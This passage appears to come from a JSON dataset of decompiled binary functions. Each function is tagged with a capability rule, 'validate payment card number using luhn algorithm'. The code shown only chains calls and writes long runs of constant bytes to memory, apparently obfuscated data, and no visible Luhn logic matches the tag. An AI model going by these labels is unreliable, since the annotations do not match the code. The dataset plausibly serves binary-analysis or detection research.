  *0x446030 = 0xe5;\n    *0x446031 = 0x62;\n    *0x446032 = 0x7c;\n    *0x446033 = 0x37;\n    *0x446034 = 0xd7;\n    *0x446035 = 0x72;\n    *0x446036 = 0x1a;\n    *0x446037 = 0x6d;\n    *0x446038 = 0x8a;\n    *0x446039 = 0xb7;\n    *0x44603a = 0x42;\n    *0x44603b = 0x65;\n    return param_1 + iVar1 + 0x13292d;\n}\n",
        "token_count": 1277
    },
    "00407360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407360(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004070b0(param_1);\n    *0x44544a = 0xec;\n    *0x44544b = 0x32;\n    *0x44544c = 0x23;\n    *0x44544d = 0x9f;\n    *0x44544e = 0x52;\n    *0x44544f = 0x5f;\n    *0x445450 = 0x1c;\n    *0x445451 = 0xdb;\n    *0x445452 = 0xda;\n    *0x445453 = 0xcc;\n    *0x445454 = 0x9b;\n    *0x445455 = 0x58;\n    *0x445456 = 0x69;\n    *0x445457 = 0x7d;\n    *0x445458 = 0xcf;\n    *0x445459 = 0xb3;\n    *0x44545a = 0x98;\n    *0x44545b = 0xcd;\n    *0x44545c = 0xd8;\n    *0x44545d = 0x21;\n    *0x44545e = 0x31;\n    *0x44545f = 0xe8;\n    *0x445460 = 0x4f;\n    *0x445461 = 0xe8;\n    *0x445462 = 0xb5;\n    *0x445463 = 0x50;\n    *0x445464 = 0xbc;\n    *0x445465 = 0xe3;\n    *0x445466 = 0xd8;\n    *0x445467 = 0x58;\n    *0x445468 = 0x1e;\n    *0x445469 = 1;\n    *0x44546a = 3;\n    *0x44546b = 0xac;\n    *0x44546c = 0x67;\n    *0x44546d = 199;\n    *0x44546e = 0xd2;\n    *0x44546f = 199;\n    *0x445470 = 0xfd;\n    *0x445471 = 0xca;\n    *0x445472 = 0x94;\n    *0x445473 = 0x7a;\n    *0x445474 = 0x3a;\n    *0x445475 = 0x35;\n    *0x445476 = 0xce;\n    *0x445477 = 0x6c;\n    *0x445478 = 0xec;\n    *0x44609a = 0x74;\n    *0x44609b = 0x29;\n    *0x44609c = 0x44;\n    *0x44609d = 0x88;\n    *0x44609e = 0x14;\n    *0x44609f = 0xfc;\n    *0x4460a0 = 0x85;\n    *0x4460a1 = 0x56;\n    *0x4460a2 = 0x20;\n    *0x4460a3 = 0x83;\n    *0x4460a4 = 0x47;\n    *0x4460a5 = 0x19;\n    *0x4460a6 = 0x6b;\n    *0x4460a7 = 0x30;\n    *0x4460a8 = 0x80;\n    *0x4460a9 = 0x73;\n    *0x4460aa = 0xae;\n    *0x4460ab = 0x77;\n    *0x4460ac = 0x4a;\n    *0x4460ad = 0x4b;\n    *0x4460ae = 4;\n    *0x4460af = 0x50;\n    *0x4460b0 = 0x62;\n    *0x4460b1 = 0x4a;\n    *0x4460b2 = 0x6d;\n    *0x4460b3 = 0xb8;\n    *0x4460b4 = 0xaa;\n    *0x4460b5 = 0x61;\n    *0x4460b6 = 0x4b;\n    *0x4460b7 = 0x30;\n    *0x4460b8 = 0xa7;\n    *0x4460b9 = 0x41;\n    *0x4460ba = 0xe8;\n    *0x4460bb = 0x3c;\n    *0x4460bc = 3;\n    *0x4460bd = 0xe2;\n    *0x4460be = 0xee;\n    *0x4460bf = 0xe5;\n    *0x4460c0 = 0xd;\n    *0x4460c1 = 0xfd;\n    *0x4460c2 = 0xed;\n    *0x4460c3 = 0x38;\n    *0x4460c4 = 0x34;\n    *0x4460c5 = 0x92;\n    *0x4460c6 = 0xd8;\n    *0x4460c7 = 0xc5;\n    *0x4460c8 = 0x90;\n    return param_1 + iVar1 + 0x127bdb;\n}\n",
        "token_count": 1265
    },
    "00407e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00407e20(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407b70(param_1);\n    *0x445506 = 0xb0;\n    *0x445507 = 2;\n    *0x445508 = 0xb8;\n    *0x445509 = 0x22;\n    *0x44550a = 0x6a;\n    *0x44550b = 0x96;\n    *0x44550c = 0x86;\n    *0x44550d = 0xd2;\n    *0x44550e = 0xbb;\n    *0x44550f = 0x8f;\n    *0x445510 = 0x26;\n    *0x445511 = 0x6d;\n    *0x445512 = 0x16;\n    *0x445513 = 0xdd;\n    *0x445514 = 0x12;\n    *0x445515 = 0x3e;\n    *0x445516 = 0x1d;\n    *0x445517 = 0x46;\n    *0x445518 = 0x38;\n    *0x445519 = 0xa4;\n    *0x44551a = 0x29;\n    *0x44551b = 0xe3;\n    *0x44551c = 0x7b;\n    *0x44551d = 0x92;\n    *0x44551e = 0xc6;\n    *0x44551f = 0xa2;\n    *0x445520 = 0x30;\n    *0x445521 = 0xf;\n    *0x445522 = 0x34;\n    *0x445523 = 0xc3;\n    *0x445524 = 0xa2;\n    *0x445525 = 0xb7;\n    *0x445526 = 0xe7;\n    *0x445527 = 0x5b;\n    *0x445528 = 0x8f;\n    *0x445529 = 0x38;\n    *0x44552a = 8;\n    *0x44552b = 0xd3;\n    *0x44552c = 0xa9;\n    *0x44552d = 0xd5;\n    *0x44552e = 0xf2;\n    *0x44552f = 0x6a;\n    *0x445530 = 0x16;\n    *0x445531 = 0xe7;\n    *0x445532 = 0xb6;\n    *0x445533 = 0xaf;\n    *0x445534 = 0xf0;\n    *0x446156 = 0x40;\n    *0x446157 = 0x97;\n    *0x446158 = 100;\n    *0x446159 = 0xd5;\n    *0x44615a = 0x52;\n    *0x44615b = 2;\n    *0x44615c = 0x53;\n    *0x44615d = 0xd4;\n    *0x44615e = 0xee;\n    *0x44615f = 0x32;\n    *0x446160 = 0x5e;\n    *0x446161 = 0x47;\n    *0x446162 = 0x44;\n    *0x446163 = 0xd6;\n    *0x446164 = 0x9a;\n    *0x446165 = 0xcd;\n    *0x446166 = 0xe8;\n    *0x446167 = 0x1c;\n    *0x446168 = 0xba;\n    *0x446169 = 199;\n    *0x44616a = 0x51;\n    *0x44616b = 0x3a;\n    *0x44616c = 0x99;\n    *0x44616d = 0xde;\n    *0x44616e = 0x5b;\n    *0x44616f = 0xe9;\n    *0x446170 = 0xb4;\n    *0x446171 = 0x7a;\n    *0x446172 = 0xc6;\n    *0x446173 = 0xe5;\n    *0x446174 = 0xad;\n    *0x446175 = 0x4b;\n    *0x446176 = 0xb4;\n    *0x446177 = 0x6f;\n    *0x446178 = 0xc9;\n    *0x446179 = 0xc4;\n    *0x44617a = 0x2f;\n    *0x44617b = 0xcb;\n    *0x44617c = 0x73;\n    *0x44617d = 0x9b;\n    *0x44617e = 0xa1;\n    *0x44617f = 0xc1;\n    *0x446180 = 0xb7;\n    *0x446181 = 0x4b;\n    *0x446182 = 0x5a;\n    *0x446183 = 0x20;\n    *0x446184 = 200;\n    return param_1 + iVar1 + 0x1394fa;\n}\n",
        "token_count": 1222
    },
    "004080d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004080d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407e20(param_1);\n    *0x445535 = 0x57;\n    *0x445536 = 0x98;\n    *0x445537 = 8;\n    *0x445538 = 0xc5;\n    *0x445539 = 0x25;\n    *0x44553a = 0x90;\n    *0x44553b = 0x2e;\n    *0x44553c = 0x18;\n    *0x44553d = 0xe5;\n    *0x44553e = 0xca;\n    *0x44553f = 0xaf;\n    *0x445540 = 0xdf;\n    *0x445541 = 0x3c;\n    *0x445542 = 0x25;\n    *0x445543 = 0x6a;\n    *0x445544 = 3;\n    *0x445545 = 0x67;\n    *0x445546 = 0xb7;\n    *0x445547 = 0x16;\n    *0x445548 = 0xe3;\n    *0x445549 = 0xb5;\n    *0x44554a = 0x48;\n    *0x44554b = 0xbc;\n    *0x44554c = 0xd1;\n    *0x44554d = 8;\n    *0x44554e = 0xd3;\n    *0x44554f = 0x38;\n    *0x445550 = 0x93;\n    *0x445551 = 0x58;\n    *0x445552 = 9;\n    *0x445553 = 0xbd;\n    *0x445554 = 0xe3;\n    *0x445555 = 0x2f;\n    *0x445556 = 0xcd;\n    *0x445557 = 0x4e;\n    *0x445558 = 0xf0;\n    *0x445559 = 0x2e;\n    *0x44555a = 0xb8;\n    *0x44555b = 0x45;\n    *0x44555c = 0xdb;\n    *0x44555d = 0x87;\n    *0x44555e = 0x97;\n    *0x44555f = 0xcf;\n    *0x445560 = 0x3b;\n    *0x445561 = 0x81;\n    *0x445562 = 0xe8;\n    *0x445563 = 0x6d;\n    *0x446185 = 0x93;\n    *0x446186 = 0xe;\n    *0x446187 = 0x37;\n    *0x446188 = 0x7b;\n    *0x446189 = 0xf4;\n    *0x44618a = 0x54;\n    *0x44618b = 0x5a;\n    *0x44618c = 0xc9;\n    *0x44618d = 0x36;\n    *0x44618e = 0x28;\n    *0x44618f = 99;\n    *0x446190 = 0x51;\n    *0x446191 = 0xe3;\n    *0x446192 = 0x6a;\n    *0x446193 = 0x2e;\n    *0x446194 = 0xd4;\n    *0x446195 = 0xca;\n    *0x446196 = 0x5d;\n    *0x446197 = 0x1c;\n    *0x446198 = 0xb7;\n    *0x446199 = 0x7e;\n    *0x44619a = 0x29;\n    *0x44619b = 0x92;\n    *0x44619c = 0x84;\n    *0x44619d = 0xd5;\n    *0x44619e = 0x59;\n    *0x44619f = 0x77;\n    *0x4461a0 = 0x69;\n    *0x4461a1 = 0x6a;\n    *0x4461a2 = 0x5d;\n    *0x4461a3 = 0xb9;\n    *0x4461a4 = 0xb7;\n    *0x4461a5 = 0x1b;\n    *0x4461a6 = 9;\n    *0x4461a7 = 200;\n    *0x4461a8 = 100;\n    *0x4461a9 = 0x8b;\n    *0x4461aa = 0x14;\n    *0x4461ab = 0x18;\n    *0x4461ac = 0x8a;\n    *0x4461ad = 0xa1;\n    *0x4461ae = 0x9a;\n    *0x4461af = 0xa4;\n    *0x4461b0 = 0xe7;\n    *0x4461b1 = 7;\n    *0x4461b2 = 0x9b;\n    *0x4461b3 = 0x66;\n    return param_1 + iVar1 + 0x12e44a;\n}\n",
        "token_count": 1246
    },
    "00408380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408380(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004080d0(param_1);\n    *0x445564 = 0x99;\n    *0x445565 = 0xf7;\n    *0x445566 = 0x61;\n    *0x445567 = 0x75;\n    *0x445568 = 0xf4;\n    *0x445569 = 0xd9;\n    *0x44556a = 0x69;\n    *0x44556b = 0x90;\n    *0x44556c = 0x3e;\n    *0x44556d = 0xaa;\n    *0x44556e = 0x9d;\n    *0x44556f = 0x3a;\n    *0x445570 = 0xdd;\n    *0x445571 = 0;\n    *0x445572 = 0x4c;\n    *0x445573 = 0x45;\n    *0x445574 = 0x2c;\n    *0x445575 = 7;\n    *0x445576 = 0xfb;\n    *0x445577 = 0x56;\n    *0x445578 = 0xf8;\n    *0x445579 = 0xfe;\n    *0x44557a = 0xe2;\n    *0x44557b = 0x66;\n    *0x44557c = 3;\n    *0x44557d = 0xb8;\n    *0x44557e = 0x6d;\n    *0x44557f = 0x42;\n    *0x445580 = 0x84;\n    *0x445581 = 0x1d;\n    *0x445582 = 0xbc;\n    *0x445583 = 0xc;\n    *0x445584 = 0xa4;\n    *0x445585 = 0xa6;\n    *0x445586 = 0x24;\n    *0x445587 = 0xb8;\n    *0x445588 = 2;\n    *0x445589 = 0xe5;\n    *0x44558a = 0xab;\n    *0x44558b = 0x8f;\n    *0x44558c = 0x31;\n    *0x44558d = 0xfb;\n    *0x44558e = 0x90;\n    *0x44558f = 0xaf;\n    *0x445590 = 0x35;\n    *0x445591 = 0x1f;\n    *0x445592 = 0xc1;\n    *0x4461b4 = 0x5b;\n    *0x4461b5 = 0xac;\n    *0x4461b6 = 0x7a;\n    *0x4461b7 = 0xe0;\n    *0x4461b8 = 0x6c;\n    *0x4461b9 = 0x42;\n    *0x4461ba = 0x7e;\n    *0x4461bb = 0x97;\n    *0x4461bc = 0xc5;\n    *0x4461bd = 0xc1;\n    *0x4461be = 0x54;\n    *0x4461bf = 0x92;\n    *0x4461c0 = 0xb2;\n    *0x4461c1 = 0xe2;\n    *0x4461c2 = 0x8c;\n    *0x4461c3 = 0xdf;\n    *0x4461c4 = 0xa6;\n    *0x4461c5 = 0xa5;\n    *0x4461c6 = 0x17;\n    *0x4461c7 = 0xf;\n    *0x4461c8 = 0xb6;\n    *0x4461c9 = 0xcc;\n    *0x4461ca = 0xd0;\n    *0x4461cb = 0xb5;\n    *0x4461cc = 0x1c;\n    *0x4461cd = 0x5d;\n    *0x4461ce = 0xf0;\n    *0x4461cf = 0xea;\n    *0x4461d0 = 0xb4;\n    *0x4461d1 = 0x24;\n    *0x4461d2 = 0x98;\n    *0x4461d3 = 0xcc;\n    *0x4461d4 = 0x82;\n    *0x4461d5 = 0x2f;\n    *0x4461d6 = 0x4a;\n    *0x4461d7 = 0xfb;\n    *0x4461d8 = 0x2a;\n    *0x4461d9 = 0x50;\n    *0x4461da = 0x70;\n    *0x4461db = 0x1a;\n    *0x4461dc = 0x76;\n    *0x4461dd = 0x9f;\n    *0x4461de = 0xd4;\n    *0x4461df = 0x54;\n    *0x4461e0 = 0xd4;\n    *0x4461e1 = 0xf5;\n    *0x4461e2 = 0x27;\n    return param_1 + iVar1 + 0x123e2e;\n}\n",
        "token_count": 1278
    },
    "00408630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408630(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408380(param_1);\n    *0x445593 = 0x89;\n    *0x445594 = 10;\n    *0x445595 = 0x1e;\n    *0x445596 = 0x62;\n    *0x445597 = 0x62;\n    *0x445598 = 0x1d;\n    *0x445599 = 0xd5;\n    *0x44559a = 0x4d;\n    *0x44559b = 0xd3;\n    *0x44559c = 0xd0;\n    *0x44559d = 0xb9;\n    *0x44559e = 0x8d;\n    *0x44559f = 0x49;\n    *0x4455a0 = 0xfa;\n    *0x4455a1 = 0x50;\n    *0x4455a2 = 0xe2;\n    *0x4455a3 = 0x85;\n    *0x4455a4 = 0x65;\n    *0x4455a5 = 0xb5;\n    *0x4455a6 = 0x40;\n    *0x4455a7 = 0x1d;\n    *0x4455a8 = 0x4e;\n    *0x4455a9 = 0x18;\n    *0x4455aa = 0x4f;\n    *0x4455ab = 0xfa;\n    *0x4455ac = 0xe9;\n    *0x4455ad = 0x3b;\n    *0x4455ae = 0xec;\n    *0x4455af = 0xd8;\n    *0x4455b0 = 0xda;\n    *0x4455b1 = 0xf6;\n    *0x4455b2 = 0xa7;\n    *0x4455b3 = 200;\n    *0x4455b4 = 0xbd;\n    *0x4455b5 = 0xb4;\n    *0x4455b6 = 0x43;\n    *0x4455b7 = 0xb1;\n    *0x4455b8 = 0x9f;\n    *0x4455b9 = 0xf4;\n    *0x4455ba = 0x39;\n    *0x4455bb = 0xcb;\n    *0x4455bc = 0x82;\n    *0x4455bd = 0xc9;\n    *0x4455be = 0x36;\n    *0x4455bf = 0x23;\n    *0x4455c0 = 0xde;\n    *0x4455c1 = 0x5a;\n    *0x4461e3 = 0xd4;\n    *0x4461e4 = 0xd6;\n    *0x4461e5 = 0x72;\n    *0x4461e6 = 0x7b;\n    *0x4461e7 = 0x4c;\n    *0x4461e8 = 0xb0;\n    *0x4461e9 = 0xf7;\n    *0x4461ea = 200;\n    *0x4461eb = 0x6f;\n    *0x4461ec = 0xbd;\n    *0x4461ed = 0xad;\n    *0x4461ee = 0x6a;\n    *0x4461ef = 0x77;\n    *0x4461f0 = 0xfa;\n    *0x4461f1 = 0x7c;\n    *0x4461f2 = 0xa1;\n    *0x4461f3 = 0xa0;\n    *0x4461f4 = 0x8a;\n    *0x4461f5 = 0x95;\n    *0x4461f6 = 0x10;\n    *0x4461f7 = 0xab;\n    *0x4461f8 = 0x30;\n    *0x4461f9 = 0xe9;\n    *0x4461fa = 0x3e;\n    *0x4461fb = 0x5c;\n    *0x4461fc = 0xd8;\n    *0x4461fd = 0xaf;\n    *0x4461fe = 0x19;\n    *0x4461ff = 0xfc;\n    *0x446200 = 0xe;\n    *0x446201 = 0xe2;\n    *0x446202 = 0x6e;\n    *0x446203 = 0xd8;\n    *0x446204 = 0x85;\n    *0x446205 = 0xc0;\n    *0x446206 = 0x72;\n    *0x446207 = 0xc0;\n    *0x446208 = 0x92;\n    *0x446209 = 0x4d;\n    *0x44620a = 0x3c;\n    *0x44620b = 0x88;\n    *0x44620c = 0xaf;\n    *0x44620d = 0xce;\n    *0x44620e = 0x48;\n    *0x44620f = 0x8a;\n    *0x446210 = 0xf9;\n    *0x446211 = 0x4e;\n    return param_1 + iVar1 + 0x1581e4;\n}\n",
        "token_count": 1301
    },
    "004088d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004088d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408630(param_1);\n    *0x4455c2 = 0x98;\n    *0x4455c3 = 0x1a;\n    *0x4455c4 = 0x1a;\n    *0x4455c5 = 99;\n    *0x4455c6 = 0xf5;\n    *0x4455c7 = 0xe6;\n    *0x4455c8 = 0x17;\n    *0x4455c9 = 0xb2;\n    *0x4455ca = 0x94;\n    *0x4455cb = 0xf;\n    *0x4455cc = 0xa6;\n    *0x4455cd = 0xaa;\n    *0x4455ce = 0xf2;\n    *0x4455cf = 0xf3;\n    *0x4455d0 = 0xc;\n    *0x4455d1 = 0xc4;\n    *0x4455d2 = 0x3e;\n    *0x4455d3 = 0x43;\n    *0x4455d4 = 0x85;\n    *0x4455d5 = 9;\n    *0x4455d6 = 0xdd;\n    *0x4455d7 = 0x84;\n    *0x4455d8 = 0xbe;\n    *0x4455d9 = 0x99;\n    *0x4455da = 0xe7;\n    *0x4455db = 0x8e;\n    *0x4455dc = 0x5a;\n    *0x4455dd = 0x28;\n    *0x4455de = 0xa8;\n    *0x4455df = 0x10;\n    *0x4455e0 = 0x6e;\n    *0x4455e1 = 0x7b;\n    *0x4455e2 = 0x20;\n    *0x4455e3 = 10;\n    *0x4455e4 = 5;\n    *0x4455e5 = 0xef;\n    *0x4455e6 = 0x83;\n    *0x4455e7 = 0x52;\n    *0x4455e8 = 0x9d;\n    *0x4455e9 = 0xf3;\n    *0x4455ea = 0xba;\n    *0x4455eb = 0x10;\n    *0x4455ec = 0xa8;\n    *0x4455ed = 0x89;\n    *0x4455ee = 0xe0;\n    *0x4455ef = 0x42;\n    *0x4455f0 = 0xc;\n    *0x446212 = 0xf6;\n    *0x446213 = 0x23;\n    *0x446214 = 0xb1;\n    *0x446215 = 0x1d;\n    *0x446216 = 9;\n    *0x446217 = 0x32;\n    *0x446218 = 0xbe;\n    *0x446219 = 0x4b;\n    *0x44621a = 0x29;\n    *0x44621b = 0x9c;\n    *0x44621c = 0x2a;\n    *0x44621d = 0x31;\n    *0x44621e = 0x61;\n    *0x44621f = 0xca;\n    *0x446220 = 0xa1;\n    *0x446221 = 0xe9;\n    *0x446222 = 0xa1;\n    *0x446223 = 0x29;\n    *0x446224 = 0xf5;\n    *0x446225 = 0xd1;\n    *0x446226 = 0x3d;\n    *0x446227 = 0xa9;\n    *0x446228 = 0x9d;\n    *0x446229 = 0xd;\n    *0x44622a = 0x6d;\n    *0x44622b = 0x3f;\n    *0x44622c = 0x31;\n    *0x44622d = 2;\n    *0x44622e = 0xcb;\n    *0x44622f = 100;\n    *0x446230 = 0xef;\n    *0x446231 = 0xdb;\n    *0x446232 = 0xd8;\n    *0x446233 = 0x93;\n    *0x446234 = 0x39;\n    *0x446235 = 7;\n    *0x446236 = 0x77;\n    *0x446237 = 0xcf;\n    *0x446238 = 0x15;\n    *0x446239 = 0xb8;\n    *0x44623a = 0x70;\n    *0x44623b = 0x1a;\n    *0x44623c = 0xac;\n    *0x44623d = 0x66;\n    *0x44623e = 0xee;\n    *0x44623f = 0xff;\n    *0x446240 = 0xcb;\n    return param_1 + iVar1 + 0x132dbd;\n}\n",
        "token_count": 1262
    },
    "00408b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408b80(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004088d0(param_1);\n    *0x4455f1 = 0xc9;\n    *0x4455f2 = 0xc6;\n    *0x4455f3 = 0x39;\n    *0x4455f4 = 0xa3;\n    *0x4455f5 = 0x5e;\n    *0x4455f6 = 0x70;\n    *0x4455f7 = 0x19;\n    *0x4455f8 = 0xbb;\n    *0x4455f9 = 6;\n    *0x4455fa = 0x96;\n    *0x4455fb = 0x5d;\n    *0x4455fc = 0x97;\n    *0x4455fd = 0x16;\n    *0x4455fe = 0x23;\n    *0x4455ff = 0x51;\n    *0x445600 = 0xec;\n    *0x445601 = 0xf4;\n    *0x445602 = 0xb9;\n    *0x445603 = 0x96;\n    *0x445604 = 0x66;\n    *0x445605 = 0x9c;\n    *0x445606 = 0x2b;\n    *0x445607 = 0xa1;\n    *0x445608 = 0x21;\n    *0x445609 = 0x1c;\n    *0x44560a = 1;\n    *0x44560b = 0x3c;\n    *0x44560c = 0x2f;\n    *0x44560d = 0x17;\n    *0x44560e = 0xf8;\n    *0x44560f = 4;\n    *0x445610 = 0x18;\n    *0x445611 = 0x45;\n    *0x445612 = 0x80;\n    *0x445613 = 0xea;\n    *0x445614 = 0x56;\n    *0x445615 = 0xf1;\n    *0x445616 = 0x3c;\n    *0x445617 = 0xb2;\n    *0x445618 = 0xd5;\n    *0x445619 = 0x7b;\n    *0x44561a = 0x85;\n    *0x44561b = 0x77;\n    *0x44561c = 0x79;\n    *0x44561d = 0xd4;\n    *0x44561e = 0xe8;\n    *0x44561f = 0x24;\n    *0x446241 = 0x4b;\n    *0x446242 = 1;\n    *0x446243 = 9;\n    *0x446244 = 0x65;\n    *0x446245 = 0xe5;\n    *0x446246 = 0x1d;\n    *0x446247 = 0x49;\n    *0x446248 = 0xf;\n    *0x446249 = 0x77;\n    *0x44624a = 0x99;\n    *0x44624b = 0xd5;\n    *0x44624c = 0x83;\n    *0x44624d = 0x87;\n    *0x44624e = 0x32;\n    *0x44624f = 0x43;\n    *0x446250 = 0x1e;\n    *0x446251 = 0x61;\n    *0x446252 = 0x86;\n    *0x446253 = 0x32;\n    *0x446254 = 0x62;\n    *0x446255 = 0x93;\n    *0x446256 = 0x99;\n    *0x446257 = 0xc2;\n    *0x446258 = 0x74;\n    *0x446259 = 0x70;\n    *0x44625a = 0x52;\n    *0x44625b = 0x17;\n    *0x44625c = 0x9e;\n    *0x44625d = 0x8d;\n    *0x44625e = 0xff;\n    *0x44625f = 0xda;\n    *0x446260 = 0xce;\n    *0x446261 = 0x47;\n    *0x446262 = 0xcd;\n    *0x446263 = 0xb7;\n    *0x446264 = 0x16;\n    *0x446265 = 0x3a;\n    *0x446266 = 0x51;\n    *0x446267 = 0xe0;\n    *0x446268 = 0x2a;\n    *0x446269 = 0xcb;\n    *0x44626a = 3;\n    *0x44626b = 0x88;\n    *0x44626c = 0xe5;\n    *0x44626d = 0xa0;\n    *0x44626e = 0xbd;\n    *0x44626f = 0x69;\n    return param_1 + iVar1 + 0x12aae9;\n}\n",
        "token_count": 1236
    },
    "00408e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00408e30(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00408b80(param_1);\n    *0x445620 = 0x98;\n    *0x445621 = 4;\n    *0x445622 = 0xa3;\n    *0x445623 = 0xfc;\n    *0x445624 = 0x7b;\n    *0x445625 = 0xa7;\n    *0x445626 = 0x2c;\n    *0x445627 = 0x14;\n    *0x445628 = 0xe1;\n    *0x445629 = 0x6b;\n    *0x44562a = 0xaa;\n    *0x44562b = 0xd4;\n    *0x44562c = 0x7c;\n    *0x44562d = 0x94;\n    *0x44562e = 0x7a;\n    *0x44562f = 0x79;\n    *0x445630 = 0x72;\n    *0x445631 = 0x79;\n    *0x445632 = 0xab;\n    *0x445633 = 0x96;\n    *0x445634 = 0xde;\n    *0x445635 = 5;\n    *0x445636 = 0x82;\n    *0x445637 = 0x8e;\n    *0x445638 = 0x4c;\n    *0x445639 = 0x36;\n    *0x44563a = 0xf7;\n    *0x44563b = 0x1c;\n    *0x44563c = 0x41;\n    *0x44563d = 0xa1;\n    *0x44563e = 0x36;\n    *0x44563f = 0xcb;\n    *0x445640 = 0xb0;\n    *0x445641 = 0xec;\n    *0x445642 = 0x1f;\n    *0x445643 = 0x7e;\n    *0x445644 = 0x86;\n    *0x445645 = 0x52;\n    *0x445646 = 0xc6;\n    *0x445647 = 0xea;\n    *0x445648 = 0x1f;\n    *0x445649 = 0x23;\n    *0x44564a = 0xf4;\n    *0x44564b = 0x16;\n    *0x44564c = 0xce;\n    *0x44564d = 0x41;\n    *0x44564e = 0xa4;\n    *0x446270 = 0xc5;\n    *0x446271 = 0x22;\n    *0x446272 = 0x40;\n    *0x446273 = 0x3f;\n    *0x446274 = 0x6a;\n    *0x446275 = 2;\n    *0x446276 = 0xaf;\n    *0x446277 = 0x4b;\n    *0x446278 = 0x1b;\n    *0x446279 = 0xb1;\n    *0x44627a = 0x12;\n    *0x44627b = 0xd1;\n    *0x44627c = 0x41;\n    *0x44627d = 0xe6;\n    *0x44627e = 0xd4;\n    *0x44627f = 0x9b;\n    *0x446280 = 0xe9;\n    *0x446281 = 0x1d;\n    *0x446282 = 0x45;\n    *0x446283 = 0x73;\n    *0x446284 = 0x46;\n    *0x446285 = 0x12;\n    *0x446286 = 0x19;\n    *0x446287 = 0xac;\n    *0x446288 = 0x2d;\n    *0x446289 = 0x4a;\n    *0x44628a = 0xe8;\n    *0x44628b = 0x9a;\n    *0x44628c = 0x98;\n    *0x44628d = 0x8a;\n    *0x44628e = 0xac;\n    *0x44628f = 0x15;\n    *0x446290 = 0x24;\n    *0x446291 = 0x5d;\n    *0x446292 = 0x46;\n    *0x446293 = 0xfb;\n    *0x446294 = 0x93;\n    *0x446295 = 0x93;\n    *0x446296 = 0xf9;\n    *0x446297 = 0xab;\n    *0x446298 = 0x4a;\n    *0x446299 = 0xbd;\n    *0x44629a = 0xed;\n    *0x44629b = 0x8a;\n    *0x44629c = 0xd4;\n    *0x44629d = 0xb2;\n    *0x44629e = 0xad;\n    return param_1 + iVar1 + 0x1082fa;\n}\n",
        "token_count": 1223
    },
    "00409640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00409640(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409390(param_1);\n    *0x4456ad = 0xe2;\n    *0x4456ae = 0x9b;\n    *0x4456af = 0x4f;\n    *0x4456b0 = 0xdf;\n    *0x4456b1 = 0x70;\n    *0x4456b2 = 0xc3;\n    *0x4456b3 = 0x17;\n    *0x4456b4 = 0x53;\n    *0x4456b5 = 0x49;\n    *0x4456b6 = 0x55;\n    *0x4456b7 = 0x9f;\n    *0x4456b8 = 0xce;\n    *0x4456b9 = 0xec;\n    *0x4456ba = 200;\n    *0x4456bb = 0x20;\n    *0x4456bc = 0x53;\n    *0x4456bd = 0x6d;\n    *0x4456be = 0xca;\n    *0x4456bf = 0xa8;\n    *0x4456c0 = 0x57;\n    *0x4456c1 = 0xf1;\n    *0x4456c2 = 0xb9;\n    *0x4456c3 = 0x96;\n    *0x4456c4 = 0x45;\n    *0x4456c5 = 0x35;\n    *0x4456c6 = 0x2b;\n    *0x4456c7 = 0x21;\n    *0x4456c8 = 0xfb;\n    *0x4456c9 = 7;\n    *0x4456ca = 0x68;\n    *0x4456cb = 0xd2;\n    *0x4456cc = 0x4b;\n    *0x4456cd = 0xcb;\n    *0x4456ce = 0xeb;\n    *0x4456cf = 5;\n    *0x4456d0 = 0x7b;\n    *0x4456d1 = 0xf8;\n    *0x4456d2 = 0xe4;\n    *0x4456d3 = 0x6c;\n    *0x4456d4 = 0xc5;\n    *0x4456d5 = 0x99;\n    *0x4456d6 = 0xb8;\n    *0x4456d7 = 0x8c;\n    *0x4456d8 = 0xd8;\n    *0x4456d9 = 0xcc;\n    *0x4456da = 0x80;\n    *0x4456db = 0x3e;\n    *0x4462fd = 0x42;\n    *0x4462fe = 0xd3;\n    *0x4462ff = 0x9d;\n    *0x446300 = 0x48;\n    *0x446301 = 0xfb;\n    *0x446302 = 0xe1;\n    *0x446303 = 0xf3;\n    *0x446304 = 0xc;\n    *0x446305 = 0x88;\n    *0x446306 = 5;\n    *0x446307 = 0xfd;\n    *0x446308 = 0x4d;\n    *0x446309 = 0xeb;\n    *0x44630a = 0x58;\n    *0x44630b = 0x90;\n    *0x44630c = 0x85;\n    *0x44630d = 0x6a;\n    *0x44630e = 0x54;\n    *0x44630f = 4;\n    *0x446310 = 0xd4;\n    *0x446311 = 0x11;\n    *0x446312 = 0x5a;\n    *0x446313 = 0xb7;\n    *0x446314 = 0x78;\n    *0x446315 = 0x2d;\n    *0x446316 = 0x2d;\n    *0x446317 = 0x88;\n    